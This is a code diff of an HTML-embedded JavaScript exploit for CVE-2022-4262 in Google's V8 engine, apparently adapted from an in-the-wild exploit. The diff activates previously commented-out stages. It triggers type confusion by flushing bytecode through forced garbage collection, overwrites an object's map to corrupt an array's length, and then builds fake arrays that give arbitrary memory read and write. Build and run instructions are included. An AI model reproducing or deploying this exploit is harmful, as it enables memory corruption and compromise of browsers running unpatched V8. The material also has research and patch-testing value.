@@ -1,40 +1,53 @@
 <script>
-  // Build d8 using:
+    // Exploit for CVE-2022-4262
+// author: @mistymntncop
+// based on the ITW exploit (author unknown) found by @_clem1
+//
+// Build d8 using:
 // a) Run once
 //    git checkout 18865d6af0404f2d2aeb1c99dd73503364ce0967
 //    gclient sync
-//    gn gen ./out/x64.debug
-//    gn gen ./out/x64.release
 //
-// b) 
+//    If you want to DebugPrint the feedback vector apply the patch with
+//    (make sure you are in the root V8 folder):
+//    git apply C:\path\to\patch\dbg.patch
+//
+//    You can revert the patch with:
+//    git apply -R C:\path\to\patch\dbg.patch    
+//
+// b) Run per each compilation
+//
 //    Debug Build:
-//    ninja -C ./out/x64.debug d8
+//    py ./tools/dev/gm.py x64.debug
 //
 //    Release Build:
-//    ninja -C ./out/x64.release d8
+//    py ./tools/dev/gm.py x64.release
 //
 // Run:
+// C:\path\to\v8\d8.exe --allow-natives-syntax exploit.js
+//
+// if this does not work for you try the "bytecode-old-age" flag.
 // C:\path\to\v8\d8.exe --allow-natives-syntax --bytecode-old-age=3 exploit.js
 
-var arr_buf = new ArrayBuffer(8);
-var f64_arr = new Float64Array(arr_buf);
-var b64_arr = new BigInt64Array(arr_buf);
+var conv_ab = new ArrayBuffer(8);
+var conv_f64 = new Float64Array(conv_ab);
+var conv_b64 = new BigInt64Array(conv_ab);
 
 function dtoi(f) {
-    f64_arr[0] = f;
-    return b64_arr[0];
+    conv_f64[0] = f;
+    return conv_b64[0];
 }
 
 function itod(i) {
-    b64_arr[0] = i;
-    return f64_arr[0];
+    conv_b64[0] = i;
+    return conv_f64[0];
 }
 
 function ptr(addr) {
     return addr | 1n;
 }
 function unptr(addr) {
-    return addr & ~1n;
+    return addr & ~3n;
 }
 
 function smi(i) {
@@ -102,14 +115,25 @@ function v8_write64(addr, val) {
     large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));   
 }
 
-function trigger_gc() {
+function gc_minor() { //scavenge
+    for(let i = 0; i < 1000; i++) {
+        new ArrayBuffer(0x10000);
+    }
+}
+
+function gc_major() { //mark-sweep
+    new ArrayBuffer(0x7fe00000);
+}
+
+//https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/18865d6af0404f2d2aeb1c99dd73503364ce0967:src/flags/flag-definitions.h;l=1444
+function flush_bytecode() {
     try {
-      let tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
-    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
-    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
-    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
-    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
-    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
+        //please change to be the "bytecode_old_age" value from ./src/flags/flag-definitions.h
+        //you can observe if this is working by passing the "--trace-gc" flag
+        const bytecode_old_age = 5;
+        for(let i = 0; i < (bytecode_old_age+1); i++) {
+            gc_major();
+        }
     } catch(err) {
         print(err);
     }
@@ -134,122 +158,146 @@ function make_big() {
     result.extra = 1;
     return result;
 }
-
+var ballast = null;
 var small_obj = make_small();
 var big_obj = make_big();
 var corrupted_obj = null;
 var arr1 = null;
 var arr2 = null;
-console.log("small ==========================\n");
-//%DebugPrint(small_obj);
-console.log("big ==========================\n");
-//%DebugPrint(big_obj);
-// %SystemBreak();
-for(let i = 0; i < 23; i++) {
-    console.log(i + " ===============================\n");
+//%GlobalPrint("small ==========================\n");
+//%Debugprint(small_obj);
+//%GlobalPrint("big ==========================\n");
+//%Debugprint(big_obj);
+
+//We use the SetNamedProperty instruction to cause memory corruption. This instruction 
+//uses the SetNamedStrict feedback vector slots.
+//In this example, before we trigger GC the first SetNamedStrict is at slot #4. After GC it 
+//is at slot #8. This slot now points to controlled feedback. Specifically, the
+//first SetNamedStrict slot #8 contains the corrupted_obj MAP (small_obj MAP) and the
+//second SetNamedStrict slot #9 contains the MAP we want to transition to (big_obj MAP).
+//
+//Generated Interpreter (/interpreter/interpreter-generator.cc):
+//  IGNITION_HANDLER(SetNamedProperty, InterpreterSetNamedPropertyAssembler) ->
+//  SetNamedProperty ->
+//      CallStub(Builtins::CallableFor(isolate(), Builtin::kStoreIC), ...)
+//
+//Generated Builtin (/builtins/builtins-ic-gen.cc):
+//  Builtins::Generate_StoreIC ->
+//Generated Builtin (/ic/accessor-assembler.cc):
+//  AccessorAssembler::GenerateStoreIC ->
+//  AccessorAssembler::StoreIC ->
+//  AccessorAssembler::HandleStoreICHandlerCase ->
+//        BIND(&store_transition_or_global) ->
+//        BIND(&store_transition) ->
+//  AccessorAssembler::HandleStoreICTransitionMapHandlerCase ->
+//  AccessorAssembler::OverwriteExistingFastDataProperty ->
+//        BIND(&if_field) ->
+//        BIND(&backing_store) -> 
+//  CodeStubAssembler::StoreMap
+
+//First 10 iterations of the loop installs the feedback vector and seeds it with feedback.
+//The 11th iteration triggers the vuln and changes the MAP of corrupted_obj.
+for(let i = 0; i < 11; i++) {
+    //%GlobalPrint(i + " ===============================\n");
     //this prevents bad results from LoadGlobalNotInsideTypeof slots from crashing the exploit
-    function dummy() { return true;}
+    function dummy() { return true; }
     
-    //use locals here instead of globals because it would create extra slots in the feedback vector
-    let target = {}; //this is the object we want to change the map of.
+    //use locals here instead of globals because otherwise it would create extra slots in the feedback vector
+    let target = {}; //placeholder - this is the object we want to change the MAP of.
     let SetNamedStrict_slot1 = {}; //this gets transitioned to "small_obj" MAP once we add property p1
     let LoadProperty_slot0 = big_obj; //this is the MAP we want to transition to.
-    if(i == 22) {
-        console.log("GC ==========================\n");
-        //this causes the code to be reparsed!
-        trigger_gc();
+    if(i == 10) {
+        //%GlobalPrint("GC ==========================\n");
+        //this causes the bytecode to be thrown away
+        flush_bytecode();
         //allocate all the objects after GC so that they are allocated in NewSpace
         corrupted_obj = make_small();
         target = corrupted_obj;
         arr1 = [1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310]; //0x0000222200002222        
-        arr2 = [large_arr,2,arr1,4,5,6,7,8];
+        arr2 = [large_arr,2,3,4,5,6,7,8];
     }
-    
+
     //This will cause corrupted_obj (small_obj MAP) to transition to a big_obj MAP
     //Unfortunately because of the nature of the vulnerability we cant put this in it's own function :-(
     ((a = class Clazz {
-        [({a: eval(), 
-           b: dummy(eval), //consumes 2 feedback slots upon reparse
-           c: dummy(
-                eval, //consumes 2 feedback slots upon reparse
-                target.p1 = 1, //this is where the target SetNamedStrict slot will be
-                [], //this Literal use one feedback slot. This is important. Has to be a valid pointer!
-                SetNamedStrict_slot1.p1 = 1, //small_obj MAP will be in the second SetNamedStrict slot
-                LoadProperty_slot0.p1 //big_obj MAP will be in the first LoadProperty slot
-             )
-          }
-        ? 1000000 : (ballast = 1)) //this crap is to make sure the slot length of the feedback vector and feedback metadata are equal
+       [(dummy(
+            eval(),
+            eval, //consumes 2 feedback slots (LoadGlobalNotInsideTypeof) upon reparse
+            eval, //consumes 2 feedback slots (LoadGlobalNotInsideTypeof) upon reparse
+            target.p1 = 123, //this is where the target SetNamedStrict slot will be
+            [], //this Literal (AllocationSite) uses one feedback slot. This is important. Slot value has to be a valid pointer!
+            SetNamedStrict_slot1.p1 = 1, //small_obj MAP will be in the second SetNamedStrict slot
+            LoadProperty_slot0.p1 //big_obj MAP will be in the first LoadProperty slot
+        )
+        ? 0 : (ballast = 1)) //this crap is to make sure the slot length of the feedback vector and feedback metadata are equal
        ]
     }) => {})();
 }
-// console.log('xmzysnypnc');
-//%DebugPrint(corrupted_obj);
-// %DebugPrint(arr1);
-alert(arr1.length);
-// corrupted_obj.p18 = 0x30; //modify length of arr1 array
-// // alert("1");
-// console.log(arr1.length);
-// // %SystemBreak();
-// let large_arr_addr = dtoi(arr1[7]) & 0xFFFFFFFFn;
-// let large_arr_elements_field_addr = large_arr_addr + 8n;
-// let arr1_addr = dtoi(arr1[8]) & 0xFFFFFFFFn;
+//*
+//%Debugprint(corrupted_obj);
+corrupted_obj.p18 = 0x30; //modify length of arr1 array
+//%Debugprint(arr1);
+alert(arr1[7]);
+let large_arr_addr = dtoi(arr1[7]) & 0xFFFFFFFFn;
+let large_arr_elements_field_addr = large_arr_addr + 8n;
 
-// let packed_double_map_and_props = dtoi(arr1[4]);
-// packed_double_map = packed_double_map_and_props & 0xFFFFFFFFn;
-// packed_double_props = packed_double_map_and_props >> 32n;
-// let packed_double_elements = dtoi(arr1[5]) & 0xFFFFFFFFn;
+let packed_double_map_and_props = dtoi(arr1[4]);
+packed_double_map = packed_double_map_and_props & 0xFFFFFFFFn;
+packed_double_props = packed_double_map_and_props >> 32n;
+let packed_double_elements = dtoi(arr1[5]) & 0xFFFFFFFFn;
 
-// let packed_map_and_props = dtoi(arr1[11]);
-// packed_map = packed_map_and_props & 0xFFFFFFFFn;
-// let packed_props = packed_map_and_props >> 32n;
+let packed_map_and_props = dtoi(arr1[11]);
+packed_map = packed_map_and_props & 0xFFFFFFFFn;
+let packed_props = packed_map_and_props >> 32n;
 
-// let fixed_arr_map = dtoi(arr1[6]) & 0xFFFFFFFFn;
+let fixed_arr_map = dtoi(arr1[6]) & 0xFFFFFFFFn;
 
-// arr1[0] = itod(packed_double_map | (packed_double_props << 32n));
-// arr1[1] = itod((large_arr_elements_field_addr - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));
+arr1[0] = itod(packed_double_map | (packed_double_props << 32n));
+arr1[1] = itod((large_arr_elements_field_addr - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));
 
-// let temp_fake_arr_addr = packed_double_elements + FIXED_ARRAY_HEADER_SIZE;
-// arr1[7] = itod(temp_fake_arr_addr);
-// let temp_fake_arr = arr2[0];
-// let large_arr_elements_addr = dtoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
-// temp_fake_arr = null;
+let temp_fake_arr_addr = packed_double_elements + FIXED_ARRAY_HEADER_SIZE;
+arr1[7] = itod(temp_fake_arr_addr);
+let temp_fake_arr = arr2[0];
+let large_arr_elements_addr = dtoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
+temp_fake_arr = null;
 
-// let fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
-// fake_arr_elements_addr = fake_arr_addr + 16n;
+let fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
+fake_arr_elements_addr = fake_arr_addr + 16n;
 
-// large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
-// large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));
-// large_arr[2] = itod(fixed_arr_map | (smi(0n) << 32n));
+large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
+large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));
+large_arr[2] = itod(fixed_arr_map | (smi(0n) << 32n));
 
-// arr1[7] = itod(fake_arr_addr);
-// fake_arr = arr2[0];
+arr1[7] = itod(fake_arr_addr);
+fake_arr = arr2[0];
 
-// //cleanup
-// let small_obj_addr = addr_of(small_obj);
-// let small_obj_map_and_props = v8_read64(small_obj_addr);
-// let corrupted_obj_addr = addr_of(corrupted_obj);
-// v8_write64(corrupted_obj_addr, small_obj_map_and_props); //restore the corrupted MAP
-// corrupted_obj = null;
+//cleanup
+corrupted_obj.p18 = 4;
+let small_obj_addr = addr_of(small_obj);
+let small_obj_map_and_props = v8_read64(small_obj_addr);
+let corrupted_obj_addr = addr_of(corrupted_obj);
+v8_write64(corrupted_obj_addr, small_obj_map_and_props); //restore the corrupted MAP
+corrupted_obj = null;
 
 
-// console.log("large arr ======================\n");
-// %DebugPrint(large_arr);
-// console.log("arr1 ===========================\n");
-// %DebugPrint(arr1);
-// console.log("arr2 ===========================\n");
-// %DebugPrint(arr2);
-// console.log("small_obj_addr = " + small_obj_addr.toString(16) + "\n");
-// console.log("small_obj_map_and_props = " + small_obj_map_and_props.toString(16) + "\n");
-// console.log("corrupted_obj_addr = " + corrupted_obj_addr.toString(16) + "\n");
+//%GlobalPrint("large arr ======================\n");
+//%Debugprint(large_arr);
+//%GlobalPrint("arr1 ===========================\n");
+//%Debugprint(arr1);
+//%GlobalPrint("arr2 ===========================\n");
+//%Debugprint(arr2);
+//%GlobalPrint("small_obj_addr = " + small_obj_addr.toString(16) + "\n");
+//%GlobalPrint("small_obj_map_and_props = " + small_obj_map_and_props.toString(16) + "\n");
+//%GlobalPrint("corrupted_obj_addr = " + corrupted_obj_addr.toString(16) + "\n");
 
 
-// console.log("large_arr_addr = " + large_arr_addr.toString(16) + "\n");
-// console.log("arr1_addr = " + arr1_addr.toString(16) + "\n");
-// console.log("fixed_arr_map = " + fixed_arr_map.toString(16) + "\n");
-// console.log("packed_double_elements = " + packed_double_elements.toString(16) + "\n");
-// console.log("large_arr_elements_addr = " + large_arr_elements_addr.toString(16) + "\n");
-// console.log("fake_arr_addr = " + fake_arr_addr.toString(16) + "\n");
+//%GlobalPrint("large_arr_addr = " + large_arr_addr.toString(16) + "\n");
+//%GlobalPrint("fixed_arr_map = " + fixed_arr_map.toString(16) + "\n");
+//%GlobalPrint("packed_double_elements = " + packed_double_elements.toString(16) + "\n");
+//%GlobalPrint("large_arr_elements_addr = " + large_arr_elements_addr.toString(16) + "\n");
+//%GlobalPrint("fake_arr_addr = " + fake_arr_addr.toString(16) + "\n");
 
-//%DebugPrint(fake_arr);
+////%Debugprint(fake_arr);
+//*/
 
 </script>
